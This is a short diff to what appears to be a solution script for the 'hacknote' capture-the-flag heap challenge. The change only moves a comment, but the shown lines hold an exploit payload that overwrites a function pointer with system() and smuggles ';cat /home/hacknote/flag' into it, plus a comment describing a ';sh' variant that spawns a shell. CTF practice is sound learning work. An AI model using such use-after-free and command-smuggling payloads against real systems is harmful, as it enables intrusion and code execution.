@@ -47,7 +47,8 @@ def main():
 	# in this part I recommend you to check with gdb or something else for better understanding
 	delete(0)
 	delete(1)
-	payload = p32(system_addr) + ";cat /home/hacknote/flag\x00"   # system() and ";" friend ^.^ 
+	# system() and ";" friend ^.^ 
+	payload = p32(system_addr) + ";cat /home/hacknote/flag\x00"   
 	# here: because the system is already vulnerability so we can use size < 0x70 (like 90)
 	# but now with most modern system we should use size = 8, hence 
 	# payload = p32(system_addr) + ";sh\x00" , add(8, payload) => get shell and find flag
